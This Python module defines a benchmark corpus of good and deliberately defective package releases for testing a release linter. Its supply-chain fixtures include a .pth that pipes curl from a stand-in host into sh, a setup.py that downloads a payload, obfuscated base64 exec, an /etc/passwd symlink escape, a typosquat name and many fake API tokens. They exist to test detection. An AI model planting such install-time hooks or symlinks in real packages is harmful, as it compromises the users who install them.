"""The benchmark corpus: good releases and deliberately broken ones, each broken
case labelled with the defect it contains, whether PyPI itself rejects it
(`pypi=True`, with the rule's source) and the reldoctor code that should fire.

Generated from scratch (see build.py); deterministic and offline.
"""
from __future__ import annotations

import os
import random
import zipfile
from dataclasses import dataclass, field
from typing import Callable, List, Optional, Set

from . import build as b
from .build import Mutator, X86_64_MACHO, ARM64_MACHO, elf, frag, macho_fat, macho_thin, pe

W = "https://github.com/pypi/warehouse/blob/main/warehouse/"


@dataclass
class Case:
    id: str
    kind: str                    # good | bad
    category: str                # pypi | leak | integrity | binary | supply | diff | good
    build: Callable[[str], Optional[str]]   # (case_dir) -> optional "previous release" dir
    expect: Set[str] = field(default_factory=set)
    pypi: Optional[bool] = None  # bad cases: does PyPI refuse the upload?
    source: str = ""
    note: str = ""


CASES: List[Case] = []


def case(id, kind, category, expect=(), pypi=None, source="", note=""):
    def deco(fn):
        CASES.append(Case(id, kind, category, fn, set(expect), pypi, source, note))
        return fn
    return deco


def _dist(d):  # the directory the tools are pointed at
    return os.path.join(d, "dist")


def rel(d, **kw):
    b.release(_dist(d), **kw)


def wheel_only(d, **kw):
    b.build_wheel(_dist(d), **kw)


def pair(d, **kw):
    """A wheel plus a matching sdist (the normal way to publish)."""
    b.build_wheel(_dist(d), **kw)
    skw = {k: kw[k] for k in ("requires_python", "meta", "body") if k in kw}
    b.build_sdist(_dist(d), **skw)


# =========================== GOOD ===========================

@case("good_pure", "good", "good")
def _(d): rel(d)


@case("good_pure_wheel_only", "good", "good")
def _(d): pair(d)


@case("good_cli_entry_point", "good", "good")
def _(d):
    rel(d, wheel=dict(entry_points="[console_scripts]\nwidgetctl = acme_widgets.cli:main\n"))


@case("good_rst_readme", "good", "good")
def _(d):
    rel(d, wheel=dict(body="Acme Widgets\n============\n\nSee `docs <https://acme-widgets.dev>`_.\n",
                      meta=Mutator({"Description-Content-Type": "text/x-rst"})),
        sdist=dict(body="Acme\n====\n", meta=Mutator({"Description-Content-Type": "text/x-rst"})))


@case("good_docs_example_secrets", "good", "good",
      note="documented AWS example key and a docs-style path must not be flagged")
def _(d):
    doc = ("Example only: key = " + frag("AKIA", "IOSFODNN7", "EXAMPLE") + "\npath: /home/user/project\n"
           "export TOKEN=" + frag("ghp", "_") + "your-token-here\n").encode()
    rel(d, wheel=dict(files={"acme_widgets/README.txt": doc}))


@case("good_key_parser_code", "good", "good",
      note="code that mentions the PEM header string is not a key")
def _(d):
    code = ('MARKER = "-----BEGIN ' + 'PRIVATE KEY-----"\n').encode()
    rel(d, wheel=dict(files={"acme_widgets/pem.py": code}))


@case("good_manylinux_x86_64", "good", "good")
def _(d):
    pair(d, tag="cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64",
         files={"acme_widgets/_speed.cpython-311-x86_64-linux-gnu.so": elf(62, "GLIBC_2.17")})


@case("good_manylinux_aarch64", "good", "good")
def _(d):
    pair(d, tag="cp312-cp312-manylinux_2_28_aarch64",
               files={"acme_widgets/_speed.cpython-312-aarch64-linux-gnu.so": elf(183, "GLIBC_2.26")})


@case("good_musllinux", "good", "good")
def _(d):
    pair(d, tag="cp312-cp312-musllinux_1_2_x86_64",
               files={"acme_widgets/_speed.cpython-312-x86_64-linux-musl.so": elf(62, None, musl=True, needed_glibc=False)})


@case("good_macos_universal2", "good", "good")
def _(d):
    pair(d, tag="cp312-cp312-macosx_10_13_universal2",
               files={"acme_widgets/_speed.cpython-312-darwin.so": macho_fat([X86_64_MACHO, ARM64_MACHO], (10, 13))})


@case("good_macos_arm64", "good", "good")
def _(d):
    pair(d, tag="cp312-cp312-macosx_11_0_arm64",
               files={"acme_widgets/_speed.cpython-312-darwin.so": macho_thin(ARM64_MACHO, (11, 0))})


@case("good_windows_amd64", "good", "good")
def _(d):
    pair(d, tag="cp312-cp312-win_amd64", files={"acme_widgets/_speed.cp312-win_amd64.pyd": pe(0x8664)})


@case("good_abi3", "good", "good")
def _(d):
    pair(d, tag="cp39-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64", requires_python=">=3.9",
               files={"acme_widgets/_speed.abi3.so": elf(62, "GLIBC_2.14")})


@case("good_exe_launcher_in_pure_wheel", "good", "good",
      note="pip ships Windows .exe launchers inside a py3-none-any wheel")
def _(d):
    pair(d, files={"acme_widgets/cli-64.exe": pe(0x8664)})


@case("good_data_and_py_typed", "good", "good")
def _(d):
    pair(d, files={"acme_widgets/py.typed": b"", "acme_widgets/data/table.csv": b"a,b\n1,2\n"})


@case("good_requires_python_range", "good", "good")
def _(d):
    rel(d, wheel=dict(requires_python=">=3.9,<4"), sdist=dict(requires_python=">=3.9,<4"))


@case("good_license_or_expression", "good", "good")
def _(d):
    pair(d, meta=Mutator({"License-Expression": "Apache-2.0 OR (MIT AND BSD-3-Clause)"}))


@case("good_benign_pth", "good", "good", note="a .pth that only adds a path")
def _(d):
    pair(d, files={"acme_widgets.pth": b"./vendor\n"})


@case("good_hatch_style_sdist_setup_py", "good", "good",
      note="setup.py that only calls setuptools.setup")
def _(d):
    rel(d, sdist=dict(setup_py="from setuptools import setup\nsetup()\n"))


@case("good_data_scripts_rewritable", "good", "good", note="#!python is rewritten by installers; shell scripts are fine")
def _(d): rel(d, wheel=dict(files={"acme_widgets-1.0.0.data/scripts/acme": b"#!python\nprint(1)\n",
                                   "acme_widgets-1.0.0.data/scripts/acme.sh": b"#!/bin/sh\necho hi\n"}))


@case("good_url_placeholders_in_docs", "good", "good", note="https://user:password@host style examples are not leaks")
def _(d): rel(d, wheel=dict(files={"acme_widgets/README.rst": b"Use https://user:password@pkgs.corp.net/simple or https://${USER}:${TOKEN}@pkgs.corp.net/simple\n"}))


@case("good_testing_dir_in_package", "good", "good")
def _(d):
    pair(d, files={"acme_widgets/tests/__init__.py": b"", "acme_widgets/tests/test_x.py": b"def test(): pass\n"})


# =========================== PyPI rejects ===========================

def _meta(replace=None, **kw): return Mutator(replace, **kw)


@case("direct_url_dependency", "bad", "pypi", {"direct_url_dependency"}, True, W + "forklift/metadata.py (Can't have direct dependency)")
def _(d): wheel_only(d, meta=_meta(add=[("Requires-Dist", "fastjson @ git+https://example.com/fastjson.git")]))


@case("license_and_expression", "bad", "pypi", {"license_conflict"}, True, W + "forklift/metadata.py (License is deprecated when License-Expression is present)")
def _(d): wheel_only(d, meta=_meta(add=[("License", "MIT")]))


@case("invalid_classifier", "bad", "pypi", {"invalid_classifier"}, True, W + "forklift/metadata.py (is not a valid classifier)")
def _(d): wheel_only(d, meta=_meta(add=[("Classifier", "Topic :: Software Development :: Widgets")]))


@case("deprecated_classifier", "bad", "pypi", {"deprecated_classifier"}, True, W + "forklift/metadata.py (has been deprecated)")
def _(d): wheel_only(d, meta=_meta(add=[("Classifier", "License :: OSI Approved :: Intel Open Source License")]))


@case("invalid_license_expression", "bad", "pypi", {"invalid_license_expression"}, True, "packaging.metadata (license-expression)")
def _(d): wheel_only(d, meta=_meta({"License-Expression": "MIT License"}))


@case("license_expression_old_metadata", "bad", "pypi", {"license_expression_old_metadata"}, True, "twine 7.0 check output, packaging.metadata")
def _(d): wheel_only(d, meta=_meta({"Metadata-Version": "2.3"}))


@case("linux_platform_tag", "bad", "pypi", {"unsupported_platform_tag"}, True, W + "utils/wheel.py (_parse_platform_tag) and forklift/legacy.py")
def _(d): wheel_only(d, tag="cp312-cp312-linux_x86_64", files={"acme_widgets/_s.cpython-312-x86_64-linux-gnu.so": elf(62, "GLIBC_2.17")})


@case("unnormalized_wheel_name", "bad", "pypi", {"wheel_name_not_normalized"}, True, W + "forklift/legacy.py (Filename should contain the normalized project name)")
def _(d):
    wheel_only(d, name="Acme_Widgets", dist_info="Acme_Widgets-1.0.0.dist-info", meta=_meta({"Name": "Acme.Widgets"}),
               files={"acme_widgets/x.py": b""})


@case("dist_info_mismatch", "bad", "pypi", {"dist_info_name_mismatch"}, True, W + "forklift/legacy.py (does not contain the required METADATA file)")
def _(d): wheel_only(d, dist_info="acme-widgets-1.0.0.dist-info")


@case("local_version", "bad", "pypi", {"local_version"}, True, W + "forklift/metadata.py (local versions)")
def _(d): wheel_only(d, version="1.0.0+ubuntu1")


@case("invalid_author_email", "bad", "pypi", {"invalid_author_email"}, True, W + "forklift/metadata.py (email_validator)")
def _(d): wheel_only(d, meta=_meta({"Author-email": "Acme <dev@acme.local>"}))


@case("bad_content_type", "bad", "pypi", {"bad_content_type"}, True, "packaging.metadata (description-content-type)")
def _(d): wheel_only(d, meta=_meta({"Description-Content-Type": "text/html"}))


@case("summary_too_long", "bad", "pypi", {"summary_too_long"}, True, W + "forklift/metadata.py (_LENGTH_LIMITS)")
def _(d): wheel_only(d, meta=_meta({"Summary": "x" * 600}))


@case("project_url_label_too_long", "bad", "pypi", {"project_url_rejected"}, True, W + "forklift/metadata.py (project-url label)")
def _(d): wheel_only(d, meta=_meta(add=[("Project-URL", "L" * 40 + ", https://example.com")]))


@case("unsupported_metadata_version", "bad", "pypi", {"bad_metadata_version"}, True, W + "forklift/metadata.py (SUPPORTED_METADATA_VERSIONS)")
def _(d): wheel_only(d, meta=_meta({"Metadata-Version": "2.0"}))


@case("license_file_missing", "bad", "pypi", {"license_file_missing"}, True, W + "forklift/legacy.py (License-File ... does not exist)")
def _(d): wheel_only(d, license_file=False)


@case("invalid_dynamic", "bad", "pypi", {"invalid_dynamic_field"}, True, W + "forklift/metadata.py (not a valid dynamic field)")
def _(d): wheel_only(d, meta=_meta(add=[("Dynamic", "Version")]))


@case("bad_requires_python", "bad", "pypi", {"bad_requires_python"}, True, "packaging.metadata (requires-python)")
def _(d): wheel_only(d, meta=_meta({"Requires-Python": ">=three"}))


@case("bad_requires_dist", "bad", "pypi", {"bad_requirement"}, True, W + "forklift/metadata.py (is invalid)")
def _(d): wheel_only(d, meta=_meta(add=[("Requires-Dist", "requests >=>= 2")]))


@case("record_missing", "bad", "pypi", {"no_record"}, True, W + "forklift/legacy.py (does not contain the required RECORD file)")
def _(d): wheel_only(d, record="missing")


@case("non_normalized_member", "bad", "pypi", {"path_not_normalized"}, True, W + "forklift/legacy.py (Archive member path is not normalized)")
def _(d): wheel_only(d, extra_members=[("acme_widgets/./extra.py", b"x = 1\n")])


@case("bzip2_member", "bad", "pypi", {"unsupported_compression"}, True, W + "forklift/legacy.py (zip compression)")
def _(d): wheel_only(d, compression=zipfile.ZIP_BZIP2)


@case("sdist_name_version_mismatch", "bad", "pypi", {"version_mismatch", "version_drift"}, True, W + "forklift/legacy.py (Version in filename should be)")
def _(d): b.build_sdist(_dist(d), version="1.0.0", filename="acme_widgets-1.0.1.tar.gz")


# =========================== leaks (PyPI accepts) ===========================

def leak(id, path, data, expect=("sensitive_file", "secret_in_file"), cat="leak", **kw):
    @case(id, "bad", cat, expect, False)
    def _(d, path=path, data=data):
        rel(d, wheel=dict(files={path: data}))
    return _


leak("leak_dotenv", "acme_widgets/.env", b"DEBUG=1\n", {"sensitive_file"})
leak("leak_pypirc", "acme_widgets/.pypirc", b"[pypi]\n", {"sensitive_file"})
leak("leak_id_rsa", "acme_widgets/id_rsa", b"x", {"sensitive_file"})
leak("leak_pem_in_py", "acme_widgets/cfg.py",
     ("KEY = '''-----BEGIN " + "RSA PRIVATE KEY-----\n" + ("MIIEowIBAAKCAQEA" + "x" * 48 + "\n") * 6 + "-----END RSA PRIVATE KEY-----'''\n").encode(), {"secret_in_file"})
leak("leak_aws_key", "acme_widgets/cfg.py", ("AWS = '" + frag("AKIA", "QYLPMN5HHZ3P7ZK2") + "'\n").encode(), {"secret_in_file"})
leak("leak_github_token", "acme_widgets/cfg.py", ("T = '" + frag("ghp", "_") + "aB3dE5fG7hJ9kL1mN3pQ5rS7tU9vW1xY3zA5'\n").encode(), {"secret_in_file"})
leak("leak_pypi_token", "acme_widgets/cfg.py", ("T = '" + frag("pypi-", "AgEIcHlwaS5vcmc") + "A" * 60 + "'\n").encode(), {"secret_in_file"})
leak("leak_stripe_live", "acme_widgets/cfg.py", ("S = '" + frag("sk_", "live_") + "51H8aBcDeFgHiJkLmNoPqRsT'\n").encode(), {"secret_in_file"})
leak("leak_openai_key", "acme_widgets/cfg.py", ("O = '" + frag("sk-", "proj-") + "aB3dE5fG7hJ9kL1mN3pQ5rS7tU9vW1xY3zA5bC7dE9fG1hJ3k'\n").encode(), {"secret_in_file"})
leak("leak_anthropic_key", "acme_widgets/cfg.py", ("A = '" + frag("sk-", "ant-api03-") + "aB3dE5fG7hJ9kL1mN3pQ5rS7tU9vW1xY3zA5bC7dE9fG1hJ3kL5mN7pQ9rS1tU3vW5x'\n").encode(), {"secret_in_file"})
leak("leak_google_api_key", "acme_widgets/cfg.py", ("G = '" + frag("AIza", "SyA-") + "x1y2z3" * 5 + "a'\n").encode(), {"secret_in_file"})
leak("leak_npm_token", "acme_widgets/cfg.py", ("N = '" + frag("npm", "_") + "aB3dE5fG7hJ9kL1mN3pQ5rS7tU9vW1xY3zA5'\n").encode(), {"secret_in_file"})
leak("leak_sendgrid", "acme_widgets/cfg.py", ("SG = '" + frag("SG", ".") + "aB3dE5fG7hJ9kL1mN3pQ5r" + "." + "aB3dE5fG7hJ9kL1mN3pQ5rS7tU9vW1xY3zA5bC7dE9f" + "'\n").encode(), {"secret_in_file"})
leak("leak_slack_webhook", "acme_widgets/cfg.py", ("W = '" + frag("https://hooks.", "slack.com/services/") + "T0123ABCDEF/B0123ABCDEF/aB3dE5fG7hJ9kL1mN3pQ5rS7'\n").encode(), {"secret_in_file"})
leak("leak_database_url", "acme_widgets/cfg.py", frag("DB = 'postgresql", "://svc_app:", "Tr0ub4dor3xQz", "@db.prod.internal:5432/app'\n").encode(), {"secret_in_file"})
leak("leak_npmrc_token", "acme_widgets/.npmrc", ("//registry.npmjs.org/:_authToken=" + "aB3dE5fG7hJ9kL1mN3pQ5rS7tU9v\n").encode(), {"secret_in_file"})
leak("leak_service_account_json", "acme_widgets/sa.json",
     ('{"type":"service_account","private_key":"-----BEGIN ' + 'PRIVATE KEY-----\\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASC' + 'x' * 60 + '\\n-----END PRIVATE KEY-----\\n"}').encode(), {"secret_in_file"})
leak("leak_pkcs12", "acme_widgets/cert.p12", b"\x30\x82", {"sensitive_file"})
leak("leak_git_dir", "acme_widgets/.git/config", b"[core]\n", {"vcs_metadata_shipped"})
leak("leak_sourcemap", "acme_widgets/static/app.js.map", b'{"version":3,"sources":["src/app.ts"]}', {"source_map_shipped"}, "supply")
leak("leak_sqlite_db", "acme_widgets/data/cache.db", b"SQLite format 3\x00" + b"\0" * 100, {"database_file_shipped"}, "supply")
leak("leak_home_path_in_binary", "acme_widgets/_speed.cpython-312-x86_64-linux-gnu.so",
     elf(62, "GLIBC_2.17") + b"/home/someuser/projects/acme/src/lib.c\0", {"local_path_leak"}, "supply")


@case("leak_home_path_in_json", "bad", "supply", {"local_path_leak"}, False)
def _(d): rel(d, wheel=dict(files={"acme_widgets/build_info.json": b'{"root": "/Users/someuser/work/acme"}'}))


leak("leak_credential_url", "acme_widgets/cfg.py", frag("INDEX = 'https", "://deploy:", "Zq8Lm2Vx9Kd4", "@pkgs.corp-internal.net/simple'\n").encode(), {"secret_in_file"})
leak("leak_vault_password_file", "ansible/.vault_pass", b"hunter2\n", {"sensitive_file"})
leak("leak_agent_settings", "acme_widgets/.claude/settings.local.json", b'{"env": {}}', {"maybe_sensitive_file"})


@case("wheel_version_major_2", "bad", "integrity", {"wheel_version_unsupported"}, False, note="pip and installer refuse it at install time")
def _(d): wheel_only(d, wheel_version="2.0")


@case("script_hardcoded_python", "bad", "supply", {"script_hardcoded_interpreter"}, False)
def _(d): rel(d, wheel=dict(files={"acme_widgets-1.0.0.data/scripts/acme": b"#!/usr/bin/python3\nprint(1)\n"}))


@case("leak_in_sdist_only", "bad", "leak", {"sensitive_file", "secret_in_file"}, False)
def _(d): rel(d, sdist=dict(files={"config/.env": b"SECRET_KEY=1\n"}))


# =========================== integrity ===========================

@case("record_hash_mismatch", "bad", "integrity", {"record_hash_mismatch", "record_size_mismatch"}, False, note="PyPI only emails the maintainer")
def _(d): rel(d, wheel=dict(record="bad_hash"))


@case("record_size_mismatch", "bad", "integrity", {"record_size_mismatch"}, False)
def _(d): rel(d, wheel=dict(record="bad_size"))


@case("record_ghost_file", "bad", "integrity", {"record_missing_file"}, False)
def _(d): rel(d, wheel=dict(record="ghost"))


@case("record_omits_file", "bad", "integrity", {"record_incomplete"}, False)
def _(d): rel(d, wheel=dict(record="drop_one"))


@case("duplicate_zip_entry", "bad", "integrity", {"duplicate_entry"}, False)
def _(d): wheel_only(d, extra_members=[("acme_widgets/__init__.py", b"# second copy\n")])


@case("sdist_symlink_escape", "bad", "integrity", {"unsafe_link"}, False)
def _(d): b.build_sdist(_dist(d), links=[("passwd", "../../../../etc/passwd")])


@case("wheel_sdist_version_drift", "bad", "integrity", {"version_drift"}, False)
def _(d):
    b.build_wheel(_dist(d), version="1.0.0")
    b.build_sdist(_dist(d), version="1.0.1")


@case("wheel_sdist_dependency_drift", "bad", "integrity", {"metadata_drift"}, False)
def _(d):
    b.build_wheel(_dist(d))
    b.build_sdist(_dist(d), meta=_meta(add=[("Requires-Dist", "left-pad>=1")]), body=b.README,
                  files={})


# =========================== binary / tag truth (PyPI accepts) ===========================

def bin_case(id, expect, tag, files, **kw):
    @case(id, "bad", "binary", expect, False)
    def _(d, tag=tag, files=files, kw=kw):
        wheel_only(d, tag=tag, files=files, **kw)


bin_case("arch_aarch64_in_x86_64_wheel", {"binary_arch_mismatch"}, "cp312-cp312-manylinux_2_28_x86_64",
         {"acme_widgets/_s.cpython-312-x86_64-linux-gnu.so": elf(183, "GLIBC_2.26")})
bin_case("arch_x86_64_in_arm64_mac_wheel", {"binary_arch_mismatch"}, "cp312-cp312-macosx_11_0_arm64",
         {"acme_widgets/_s.cpython-312-darwin.so": macho_thin(X86_64_MACHO, (11, 0))})
bin_case("thin_binary_in_universal2", {"binary_arch_mismatch"}, "cp312-cp312-macosx_10_13_universal2",
         {"acme_widgets/_s.cpython-312-darwin.so": macho_thin(ARM64_MACHO, (11, 0))})
bin_case("win32_pe_in_amd64_wheel", {"binary_arch_mismatch"}, "cp312-cp312-win_amd64",
         {"acme_widgets/_s.cp312-win_amd64.pyd": pe(0x14C)})
bin_case("elf_in_windows_wheel", {"binary_os_mismatch"}, "cp312-cp312-win_amd64",
         {"acme_widgets/_s.cp312-win_amd64.pyd": elf(62, "GLIBC_2.17")})
bin_case("glibc_too_new_for_manylinux2014", {"manylinux_glibc_too_new"}, "cp312-cp312-manylinux2014_x86_64",
         {"acme_widgets/_s.cpython-312-x86_64-linux-gnu.so": elf(62, "GLIBC_2.34")})
bin_case("musllinux_wheel_links_glibc", {"musllinux_links_glibc"}, "cp312-cp312-musllinux_1_2_x86_64",
         {"acme_widgets/_s.cpython-312-x86_64-linux-musl.so": elf(62, "GLIBC_2.17")})
bin_case("manylinux_wheel_links_musl", {"manylinux_links_musl"}, "cp312-cp312-manylinux_2_17_x86_64",
         {"acme_widgets/_s.cpython-312-x86_64-linux-gnu.so": elf(62, None, musl=True, needed_glibc=False)})
bin_case("macos_target_too_new", {"macos_target_too_new"}, "cp312-cp312-macosx_10_9_x86_64",
         {"acme_widgets/_s.cpython-312-darwin.so": macho_thin(X86_64_MACHO, (13, 0))})
bin_case("extension_abi_mismatch", {"extension_abi_mismatch"}, "cp311-cp311-manylinux_2_17_x86_64",
         {"acme_widgets/_s.cpython-312-x86_64-linux-gnu.so": elf(62, "GLIBC_2.17")})
bin_case("abi3_wheel_version_specific_ext", {"abi3_extension_not_stable"}, "cp39-abi3-manylinux_2_17_x86_64",
         {"acme_widgets/_s.cpython-311-x86_64-linux-gnu.so": elf(62, "GLIBC_2.17")})
bin_case("binary_in_pure_wheel", {"binary_in_pure_wheel"}, "py3-none-any",
         {"acme_widgets/_s.cpython-312-x86_64-linux-gnu.so": elf(62, "GLIBC_2.17")})
bin_case("tag_conflicts_requires_python", {"tag_requires_python_conflict"}, "cp311-cp311-manylinux_2_17_x86_64",
         {"acme_widgets/_s.cpython-311-x86_64-linux-gnu.so": elf(62, "GLIBC_2.17")}, requires_python=">=3.12")
bin_case("platform_tag_without_binaries", {"platform_wheel_without_binaries"}, "py3-none-manylinux_2_17_x86_64", {})
bin_case("purelib_true_with_binaries", {"purelib_mismatch"}, "cp312-cp312-manylinux_2_17_x86_64",
         {"acme_widgets/_s.cpython-312-x86_64-linux-gnu.so": elf(62, "GLIBC_2.17")}, purelib=True)


@case("pyc_and_pycache", "bad", "binary", {"bytecode_shipped"}, False)
def _(d): wheel_only(d, files={"acme_widgets/__pycache__/x.cpython-312.pyc": b"\x00\x00"})


# =========================== supply chain (PyPI accepts) ===========================

@case("setup_py_downloads_code", "bad", "supply", {"setup_py_network"}, False)
def _(d):
    rel(d, sdist=dict(setup_py="import urllib.request\nfrom setuptools import setup\n"
                               "urllib.request.urlopen('https://example.invalid/payload')\nsetup()\n"))


@case("setup_py_hidden_exec", "bad", "supply", {"setup_py_obfuscated"}, False)
def _(d):
    rel(d, sdist=dict(setup_py="import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n"))


@case("pth_runs_code", "bad", "supply", {"pth_executes_code", "pth_suspicious_code"}, False)
def _(d): wheel_only(d, files={"acme_widgets.pth": b"import os; os.system('curl https://example.invalid/x | sh')\n"})


@case("obfuscated_exec_in_module", "bad", "supply", {"obfuscated_exec"}, False)
def _(d): wheel_only(d, files={"acme_widgets/boot.py": b"import base64\nexec(base64.b64decode(b'cHJpbnQoMSk='))\n"})


@case("console_script_named_pip", "bad", "supply", {"entry_point_shadows_command"}, False)
def _(d): wheel_only(d, entry_points="[console_scripts]\npip = acme_widgets:main\n")


@case("shadows_stdlib_logging", "bad", "supply", {"shadows_stdlib"}, False)
def _(d): wheel_only(d, files={"logging/__init__.py": b""})


@case("top_level_tests_package", "bad", "supply", {"top_level_tests"}, False)
def _(d): wheel_only(d, files={"tests/__init__.py": b"", "tests/test_a.py": b""})


@case("typosquat_name", "bad", "supply", {"typosquat_name"}, False)
def _(d):
    wheel_only(d, name="reqeusts", version="2.32.4", files={}, meta=_meta({"Name": "reqeusts"}))


@case("readme_relative_links", "bad", "supply", {"readme_relative_links"}, False, note="renders broken on PyPI")
def _(d): wheel_only(d, body="![logo](docs/logo.png)\nSee [guide](./docs/guide.md)\n")


# =========================== release diff (needs --against) ===========================

def diff_case(id, expect, prev_kw, new_kw, pypi=None):
    @case(id, "bad", "diff", expect, pypi)
    def _(d, prev_kw=prev_kw, new_kw=new_kw):
        b.release(os.path.join(d, "prev"), "acme_widgets", "1.0.0", **prev_kw)
        b.release(_dist(d), "acme_widgets", prev_kw.get("_v", "1.1.0"), **new_kw)
        return os.path.join(d, "prev")


diff_case("diff_new_dependency", {"diff_new_dependency"}, {}, dict(wheel=dict(meta=_meta(add=[("Requires-Dist", "left-pad>=1")]))))
diff_case("diff_new_console_script", {"diff_new_entry_point"}, {}, dict(wheel=dict(entry_points="[console_scripts]\nupdater = acme_widgets:u\n")))
diff_case("diff_size_blowup", {"diff_size_jump"}, {}, dict(wheel=dict(files={"acme_widgets/blob.bin": random.Random(7).randbytes(600_000)}),
                                                         with_sdist=True))
diff_case("diff_requires_python_raised", {"diff_requires_python_raised"}, {}, dict(wheel=dict(requires_python=">=3.12"), sdist=dict(requires_python=">=3.12")))
diff_case("diff_new_pth", {"diff_new_executable_code"}, {}, dict(wheel=dict(files={"acme_widgets.pth": b"./v\n"})))
diff_case("diff_package_removed", {"diff_removed_package"},
          dict(wheel=dict(files={"acme_widgets/api/__init__.py": b"x=1\n"})), dict())


@case("diff_wheel_dropped", "bad", "diff", {"diff_wheel_dropped"}, False)
def _(d):
    prev = os.path.join(d, "prev")
    b.build_wheel(prev, version="1.0.0", tag="cp312-cp312-manylinux_2_17_x86_64", files={"acme_widgets/_s.cpython-312-x86_64-linux-gnu.so": elf(62)})
    b.build_wheel(prev, version="1.0.0", tag="cp312-cp312-win_amd64", files={"acme_widgets/_s.cp312-win_amd64.pyd": pe(0x8664)})
    b.build_wheel(_dist(d), version="1.1.0", tag="cp312-cp312-manylinux_2_17_x86_64", files={"acme_widgets/_s.cpython-312-x86_64-linux-gnu.so": elf(62)})
    return prev


@case("diff_reupload_same_version", "bad", "diff", {"diff_version_exists"}, True, W + "forklift/legacy.py (File already exists)")
def _(d):
    prev = os.path.join(d, "prev")
    b.release(prev, version="1.0.0")
    b.release(_dist(d), version="1.0.0", wheel=dict(files={"acme_widgets/new.py": b"y=2\n"}))
    return prev


# =========================== round 3 ===========================

def _zip_of(members):
    import io
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, data in members.items():
            zf.writestr(name, data)
    return buf.getvalue()


_GH = frag("ghp", "_") + "aB3dE5fG7hJ9kL1mN3pQ5rS7tU9vW1xY3zA5"

leak("leak_secret_utf16", "acme_widgets/settings.txt", ("TOKEN=" + _GH + "\r\n").encode("utf-16"), {"secret_in_file"})
leak("leak_secret_in_bundled_zip", "acme_widgets/fixtures.zip", _zip_of({"cfg.py": ("T = '" + _GH + "'\n").encode()}),
     {"secret_in_file"})
leak("leak_dotenv_in_bundled_zip", "acme_widgets/fixtures.zip", _zip_of({".env": b"DEBUG=1\n"}), {"sensitive_file"})
leak("leak_testpypi_token", "acme_widgets/cfg.py",
     ("T = '" + frag("pypi-", "AgENdGVzdC5weXBpLm9yZw") + "Ik" + "aB3" * 20 + "'\n").encode(), {"secret_in_file"})
leak("leak_shopify_token", "acme_widgets/cfg.py", ("S = '" + frag("shp", "at_") + "a1b2c3d4e5f60718293a4b5c6d7e8f90'\n").encode(),
     {"secret_in_file"})
leak("leak_kubeconfig", "acme_widgets/kubeconfig", b"apiVersion: v1\n", {"sensitive_file"})
leak("leak_docker_config", "acme_widgets/.docker/config.json", b"{}", {"sensitive_file"})
leak("leak_credentials_json_name", "acme_widgets/credentials.json", b"{}", {"maybe_sensitive_file"}, "supply")


@case("binary_glibcxx_too_new", "bad", "binary", {"manylinux_glibcxx_too_new"}, False,
      source="auditwheel 6.8.2 policy/manylinux-policy.json (GLIBCXX per policy)")
def _(d):
    pair(d, tag="cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64",
         files={"acme_widgets/_s.cpython-312-x86_64-linux-gnu.so": elf(62, "GLIBC_2.17", glibcxx="GLIBCXX_3.4.26")})


@case("good_manylinux_cxx_within_policy", "good", "good")
def _(d):
    pair(d, tag="cp312-cp312-manylinux_2_28_x86_64",
         files={"acme_widgets/_s.cpython-312-x86_64-linux-gnu.so": elf(62, "GLIBC_2.17", glibcxx="GLIBCXX_3.4.24")})


@case("release_stale_wheel", "bad", "integrity", {"wheel_source_drift"}, False,
      note="a wheel left in dist/ from an earlier commit")
def _(d):
    b.build_wheel(_dist(d), tag="cp312-cp312-win_amd64", files={"acme_widgets/core.py": b"x = 1\n"})
    b.build_wheel(_dist(d), tag="cp312-cp312-win32", files={"acme_widgets/core.py": b"x = 2\n"})


@case("release_wheel_metadata_differs", "bad", "integrity", {"wheel_metadata_drift"}, False)
def _(d):
    b.build_wheel(_dist(d), tag="py3-none-any")
    b.build_wheel(_dist(d), tag="cp312-cp312-win32", meta=Mutator(add=[("Requires-Dist", "extra-dep>=1")]))


@case("windows_long_path", "bad", "supply", {"long_path"}, False)
def _(d):
    rel(d, wheel=dict(files={"acme_widgets/" + "d" * 90 + "/" + "e" * 90 + "/mod.py": b"x = 1\n"}))


@case("good_bundled_zip_clean", "good", "good", note="a data archive with ordinary files")
def _(d):
    rel(d, wheel=dict(files={"acme_widgets/data.zip": _zip_of({"table.csv": b"a,b\n1,2\n", "notes.txt": b"hello"})}))


@case("good_utf16_text", "good", "good", note="UTF-16 text without secrets")
def _(d):
    rel(d, wheel=dict(files={"acme_widgets/readme_win.txt": "Plain notes written on Windows.\r\n".encode("utf-16")}))


@case("good_secret_words_in_docs", "good", "good", note="docs that talk about credentials are not credentials")
def _(d):
    rel(d, wheel=dict(files={"acme_widgets/docs/credentials.rst": b"How to rotate credentials\n",
                             "acme_widgets/token_utils.py": b"def token(): return 1\n"}))


@case("good_matching_wheel_matrix", "good", "good")
def _(d):
    for tag, mach in (("win_amd64", 0x8664), ("win32", 0x14C)):
        b.build_wheel(_dist(d), tag=f"cp312-cp312-{tag}",
                      files={"acme_widgets/core.py": b"x = 1\n", f"acme_widgets/_s.cp312-{tag}.pyd": pe(mach)})
    b.build_sdist(_dist(d))


GOOD = [c for c in CASES if c.kind == "good"]
BAD = [c for c in CASES if c.kind == "bad"]
